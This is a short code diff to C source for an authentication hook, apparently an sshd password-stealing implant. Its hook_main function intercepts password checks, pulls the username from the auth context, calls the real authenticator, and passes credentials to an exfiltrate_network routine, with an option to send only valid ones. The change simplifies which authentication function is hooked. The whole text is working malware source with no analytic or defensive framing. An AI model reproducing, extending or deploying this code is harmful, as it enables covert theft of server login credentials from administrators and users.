@@ -44,9 +44,7 @@ typedef int (*f_auth_passwd)(void *authctx, char *pass);
 
 typedef struct {
 	config_block *config_memory;
-	f_auth_passwd auth_passwd;
 	f_auth_passwd mm_auth_passwd;
-	unsigned long use_privsep;
 } hook_ctx;
 
 void exfiltrate_network(int net_type, char *username, char *password) {
@@ -122,11 +120,7 @@ int hook_main(void *authctx, char *password) {
 	char *username = *(char **)(authctx + 0x20);
 	int result;
 
-	if (ctx->use_privsep) {
-		result = ctx->mm_auth_passwd(authctx, password);
-	} else {
-		result = ctx->auth_passwd(authctx, password);
-	}
+	result = ctx->mm_auth_passwd(authctx, password);
 
 	if (ctx->config_memory->net_type != 0) {
 		if (!ctx->config_memory->only_log_valid || result) {
